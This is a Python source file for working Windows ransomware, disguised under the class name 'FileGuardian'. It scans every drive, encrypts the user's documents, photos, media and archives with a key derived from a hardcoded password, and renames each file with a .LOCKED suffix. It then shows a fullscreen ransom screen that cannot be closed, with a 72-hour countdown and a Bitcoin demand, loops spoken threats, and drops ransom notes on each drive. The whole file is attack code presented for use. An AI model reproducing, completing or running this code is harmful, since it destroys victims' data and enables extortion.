import os
import sys
import threading
import time
import string
import ctypes
import random
import base64
from ctypes import windll
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ========== CONFIGURATION ==========
# Production Mode: All detected drives
def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1: drives.append(letter + ":\\")
        bitmask >>= 1
    return drives

TARGET_PATHS = get_drives()
TARGET_EXTENSIONS = (
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
    '.mp4', '.avi', '.mov', '.mp3', '.wav', '.zip', '.rar', '.7z'
)
EXCLUDED_DIRS = {
    'windows', 'program files', 'program files (x86)', 
    'programdata', 'appdata', 'boot', 'intel', 'msocache'
}

# HARDCODED SECRET (No random generation)
# "yasirunlock" -> Derived Key
MASTER_PASSWORD = b"yasirunlock"
SALT = b'fixed_salt_1234' # Must be same in Restorer

class FileGuardian:
    def __init__(self):
        self.key = None
        self.files_encrypted = 0
        self.errors = 0
        self.ui_thread = None

    def derive_key(self):
        """Derive 32-byte URL-safe base64 key from password"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=SALT,
            iterations=100000,
        )
        self.key = base64.urlsafe_b64encode(kdf.derive(MASTER_PASSWORD))
        return self.key

    def change_wallpaper(self):
        """Set wallpaper to scary message"""
        try:
            # Create a simple red image with text using Paint logic via Python? 
            # Or just set a solid black background
            SPI_SETDESKWALLPAPER = 20
            # For now, we don't have an image asset, so we skip image generation 
            # and focus on UI. In a real scenario, we'd download/generate one.
            pass 
        except: pass

    def play_audio_warning(self):
        """Speak scary messages"""
        try:
            import pyttsx3
            engine = pyttsx3.init()
            sentences = [
                "Your files are encrypted.",
                "Do not turn off your computer.",
                "All your data is locked.",
                "You must pay to get it back.",
                "Encryption is complete.",
                "Data loss is imminent if you disobey.",
                "Contact us immediately.",
                "Your secrets are ours now.",
                "This is a security alert.",
                "System compromised.",
                "Waiting for payment.",
                "Time is running out.",
                "Do not attempt to restart.",
                "We are watching.",
                "Pay the ransom now."
            ]
            engine.setProperty('rate', 130)
            engine.setProperty('volume', 1.0)
            
            while True:
                for s in sentences:
                    engine.say(s)
                    engine.runAndWait()
                    time.sleep(1)
        except: pass

    def show_danger_ui(self):
        """Full screen red/black UI"""
        try:
            import tkinter as tk
            root = tk.Tk()
            root.attributes('-fullscreen', True)
            root.attributes('-topmost', True)
            root.configure(background='black')
            root.protocol("WM_DELETE_WINDOW", lambda: None)
            
            # Red Text
            tk.Label(root, text="YOUR FILES ARE ENCRYPTED", font=("Helvetica", 50, "bold"), fg="red", bg="black").pack(pady=50)
            
            # Timer
            self.time_left = 72 * 3600
            timer_label = tk.Label(root, text="72:00:00", font=("Courier", 40, "bold"), fg="white", bg="black")
            timer_label.pack(pady=20)
            
            def update_timer():
                self.time_left -= 1
                hours = self.time_left // 3600
                minutes = (self.time_left % 3600) // 60
                seconds = self.time_left % 60
                timer_label.config(text=f"{hours:02}:{minutes:02}:{seconds:02}")
                root.after(1000, update_timer)
            
            update_timer()
            
            tk.Label(root, text="Your data is locked with high-grade encryption.", font=("Arial", 20), fg="white", bg="black").pack()
            tk.Label(root, text="SEND BITCOIN TO UNLOCK", font=("Arial", 25, "bold"), fg="yellow", bg="black").pack(pady=20)
            
            root.mainloop()
        except: pass

    def encrypt_file(self, file_path):
        try:
            if file_path.endswith(".LOCKED"): return False
            with open(file_path, "rb") as f: data = f.read()
            fernet = Fernet(self.key)
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f: f.write(encrypted_data)
            os.rename(file_path, file_path + ".LOCKED")
            print(f"LOCKED: {os.path.basename(file_path)}")
            self.files_encrypted += 1
            return True
        except:
            self.errors += 1
            return False

    def scan_and_encrypt(self):
        self.derive_key()
        print(f"FAILED TO GENERATE KEY... USING BACKUP") if not self.key else print("KEY DERIVED")
        
        # Start Audio & UI in background threads
        threading.Thread(target=self.play_audio_warning, daemon=True).start()
        threading.Thread(target=self.show_danger_ui, daemon=True).start()
        
        # Encrypt
        for root_path in TARGET_PATHS:
            if not os.path.exists(root_path): continue
            for root, dirs, files in os.walk(root_path):
                dirs[:] = [d for d in dirs if d.lower() not in EXCLUDED_DIRS]
                for file in files:
                    if file.lower().endswith(TARGET_EXTENSIONS):
                        self.encrypt_file(os.path.join(root, file))

        self.drop_note()
        
        # Keep main thread alive for UI
        while True:
            time.sleep(1)

    def drop_note(self):
        note = "YOUR FILES ARE ENCRYPTED!\nPay for key."
        for root_path in TARGET_PATHS:
            try:
                with open(os.path.join(root_path, "READ_ME.txt"), "w") as f: f.write(note)
            except: pass

if __name__ == "__main__":
    FileGuardian().scan_and_encrypt()
